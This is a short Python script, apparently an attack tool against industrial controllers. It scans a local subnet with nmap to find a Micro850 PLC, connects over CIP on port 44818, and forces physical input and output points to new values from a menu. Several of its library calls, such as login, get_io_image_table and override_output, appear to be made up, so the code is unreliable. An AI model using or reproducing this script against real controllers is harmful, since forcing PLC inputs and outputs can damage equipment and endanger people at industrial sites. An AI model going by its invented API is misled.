import subprocess
from scapy.all import *
import time
import threading
from pycomm import CIP

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'Micro850' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def manipulate_io_image(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Get the I/O image table
        io_image_table = cip_client.get_io_image_table()
        
        # Print the I/O image table
        print("I/O Image Table:")
        print(io_image_table)
        
        # Manipulate the I/O image table
        # For example, override the status of a physical discrete input
        input_to_override = "I0/0"  # Replace with the actual input to override
        new_status = True  # Replace with the new status
        cip_client.override_input(input_to_override, new_status)
        
        # Or, override the logic driving a physical output coil
        output_to_override = "O0/0"  # Replace with the actual output to override
        new_status = True  # Replace with the new status
        cip_client.override_output(output_to_override, new_status)
        
        print("I/O image table manipulated successfully")
    except Exception as e:
        print(f"Failed to manipulate I/O image: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        while True:
            print("1. Manipulate I/O Image")
            print("2. Exit")
            choice = input("Enter your choice: ")
            
            if choice == "1":
                manipulate_io_image(plc_ip)
            elif choice == "2":
                break
            else:
                print("Invalid choice. Please try again.")
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()